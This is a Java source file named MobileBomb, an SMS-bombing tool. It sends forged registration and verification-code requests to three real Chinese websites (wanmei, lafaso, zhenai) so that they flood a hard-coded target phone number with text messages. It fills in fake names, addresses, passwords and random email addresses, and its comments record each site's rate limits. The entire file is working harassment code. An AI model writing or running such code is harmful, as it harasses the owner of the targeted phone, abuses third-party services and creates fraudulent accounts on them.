package testMobileBomb;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.cookie.Cookie;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;
/**
 * 发给完美世界、乐蜂网
 * @author Administrator
 *
 */
public class MobileBomb {

	public static void main(String[] args) throws Exception {
		int time = 1;
		String mobileNumber = "13430363480";
		send_lafaso(mobileNumber, time);
		send_wanmei(mobileNumber, time);
		send_zhenai(mobileNumber, time);//珍爱网,暂未成功
	}

	public static void sendFinal(String mobileNumber, int time, String getUrl,
			String postUrl, List<NameValuePair> nvps) throws Exception {

		DefaultHttpClient httpclient = new DefaultHttpClient();
		try {
			for (int j = 0; j < time;) {
				System.err
						.println("-----------第" + (++j) + "次模拟--------------");
				HttpGet httpget = new HttpGet(getUrl);

				HttpResponse response = httpclient.execute(httpget);
				HttpEntity entity = response.getEntity();

				System.out.println("StatusLine: " + response.getStatusLine());
				EntityUtils.consume(entity);

				System.out.println("Initial set of cookies:");
				List<Cookie> cookies = httpclient.getCookieStore().getCookies();
				if (cookies.isEmpty()) {
					System.out.println("None");
				} else {
					for (int i = 0; i < cookies.size(); i++) {
						System.out.println("- " + cookies.get(i).toString());
					}
				}

				HttpPost httpost = new HttpPost(postUrl);

				httpost.setEntity(new UrlEncodedFormEntity(nvps, HTTP.UTF_8));

				response = httpclient.execute(httpost);
				entity = response.getEntity();

				System.out.println("StatusLine: " + response.getStatusLine());
				EntityUtils.consume(entity);

				System.out.println("Post logon cookies:");
				cookies = httpclient.getCookieStore().getCookies();
				if (cookies.isEmpty()) {
					System.out.println("None");
				} else {
					for (int i = 0; i < cookies.size(); i++) {
						System.out.println("- " + cookies.get(i).toString());
					}
				}
			}

		} finally {
			// When HttpClient instance is no longer needed,
			// shut down the connection manager to ensure
			// immediate deallocation of all system resources
			httpclient.getConnectionManager().shutdown();
		}

	}

	/**
	 * 完美世界，要隔10分钟吧
	 * 
	 * @param mobileNumber
	 * @param time
	 * @throws Exception
	 */
	public static void send_wanmei(String mobileNumber, int time)
			throws Exception {

		String getUrl = "http://passport.wanmei.com/NoteAction.do";
		String postUrl = "http://passport.wanmei.com/NoteAction.do?method=sendCode";

		List<NameValuePair> nvps = new ArrayList<NameValuePair>();
		nvps.add(new BasicNameValuePair("mobile", "13430363480"));
		nvps.add(new BasicNameValuePair("passwd", "112358"));

		sendFinal(mobileNumber, time, getUrl, postUrl, nvps);
	}

	/**
	 * 乐蜂网，一天只能三个短信
	 * 
	 * @param mobileNumber
	 * @param time
	 * @throws Exception
	 */
	public static void send_lafaso(String mobileNumber, int time)
			throws Exception {

		String getUrl = "http://www.lafaso.com/reg_new.jsp?param=phone&tourl=/ind";
		String postUrl = "http://www.lafaso.com/reg_new.jsp";

		List<NameValuePair> nvps = new ArrayList<NameValuePair>();
		nvps.add(new BasicNameValuePair("address", "广州番禺区"));
		nvps.add(new BasicNameValuePair("commendMobile", ""));
		nvps.add(new BasicNameValuePair("emlInput", getRandom(7) + "@qq.com"));
		nvps.add(new BasicNameValuePair("mobileInput", mobileNumber));
		nvps.add(new BasicNameValuePair("param", "phone"));
		nvps.add(new BasicNameValuePair("postcode", "510000"));
		nvps.add(new BasicNameValuePair("pwdInput", "112358"));
		nvps.add(new BasicNameValuePair("realInput", "与小广"));
		nvps.add(new BasicNameValuePair("repwdInput", "112358"));
		nvps.add(new BasicNameValuePair("tourl", "/ind"));
		nvps.add(new BasicNameValuePair("usrInput", getRandom(7)));

		sendFinal(mobileNumber, time, getUrl, postUrl, nvps);
	}
	
	/**
	 * 珍爱网,暂未成功
	 * 
	 * @param mobileNumber
	 * @param time
	 * @throws Exception
	 */
	public static void send_zhenai(String mobileNumber, int time)
			throws Exception {

		String getUrl = "http://register.zhenai.com/register/register.jsps";
		String postUrl = "http://register.zhenai.com/register/reg55OnView.jsps";

		
		List<NameValuePair> nvps = new ArrayList<NameValuePair>();
		nvps.add(new BasicNameValuePair("areaForm.workCity", "10101006"));
		nvps.add(new BasicNameValuePair("areaForm.workProvince", "10101000"));
		nvps.add(new BasicNameValuePair("baseInfo.children", "1"));
		nvps.add(new BasicNameValuePair("baseInfo.education", "6"));
		nvps.add(new BasicNameValuePair("baseInfo.height", "183"));
		nvps.add(new BasicNameValuePair("baseInfo.house", "3"));
		nvps.add(new BasicNameValuePair("baseInfo.introducecontent", "请用您的话向我们形容一下您自己，再描述一下您心目中理想的伴侣"));
		nvps.add(new BasicNameValuePair("baseInfo.marriage", "1"));
		nvps.add(new BasicNameValuePair("baseInfo.nickname", "龙哦"));
		nvps.add(new BasicNameValuePair("baseInfo.salary", "5"));
		nvps.add(new BasicNameValuePair("baseInfo.sex", "0"));
		nvps.add(new BasicNameValuePair("baseInfo2.servicemobile", mobileNumber));
		nvps.add(new BasicNameValuePair("copyTag", ""));
		nvps.add(new BasicNameValuePair("dateForm.day", "5"));
		nvps.add(new BasicNameValuePair("dateForm.month", "5"));
		nvps.add(new BasicNameValuePair("dateForm.year", "1988"));
		nvps.add(new BasicNameValuePair("hideMobile", ""));
		nvps.add(new BasicNameValuePair("loginInfo.email", ""));
		nvps.add(new BasicNameValuePair("loginInfo.pwd", "112358"));
		nvps.add(new BasicNameValuePair("regType", "phone"));
		nvps.add(new BasicNameValuePair("snsType", ""));
		nvps.add(new BasicNameValuePair("viewMemberId", ""));
		nvps.add(new BasicNameValuePair("whichTV", "null"));
		nvps.add(new BasicNameValuePair("xinmin", "0"));

		sendFinal(mobileNumber, time, getUrl, postUrl, nvps);
	}

	public static List<NameValuePair> genParam(String queryStr) {
		List<NameValuePair> pairList = new ArrayList<NameValuePair>();
		String[] pairs = queryStr.split("&");
		for (String item : pairs) {
			String[] pair = item.split("=");
			pairList.add(new BasicNameValuePair(pair[0],
					pair.length == 2 ? pair[1] : ""));
			System.out.println("nvps.add(new BasicNameValuePair(\"" + pair[0]
					+ "\", \"" + (pair.length == 2 ? pair[1] : "") + "\"));");
		}
		return pairList;
	}

	/**
	 * 
	 * @param bit
	 *            随机数位数
	 * @return
	 */
	public static String getRandom(int bit) {
		String[] letters = { "a", "b", "c", "d", "e", "f", "1", "2", "3", "4",
				"5", "6" };
		Random random = new Random();
		random.nextInt(letters.length);
		StringBuffer bf = new StringBuffer("");
		for (int i = 0; i < bit; i++) {
			bf.append(letters[random.nextInt(letters.length)]);
		}
		return bf.toString();
	}

}
